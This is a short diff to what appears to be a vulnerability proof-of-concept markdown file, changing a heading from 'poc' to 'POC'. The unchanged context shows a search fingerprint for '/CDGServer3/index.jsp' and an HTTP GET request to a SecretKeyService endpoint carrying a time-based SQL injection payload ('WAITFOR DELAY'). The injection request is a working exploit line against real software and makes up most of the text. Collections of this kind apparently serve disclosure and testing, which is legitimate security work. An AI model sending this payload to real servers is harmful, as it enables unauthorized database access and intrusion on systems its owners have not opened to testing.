@@ -8,7 +8,7 @@
 body="/CDGServer3/index.jsp"
 ```
 
-## poc
+## POC
 
 ```java
 GET /CDGServer3/SecretKeyService?command=sameKeyName&keyName=1'+WAITFOR+DELAY+'0:0:5'--+ HTTP/1.1
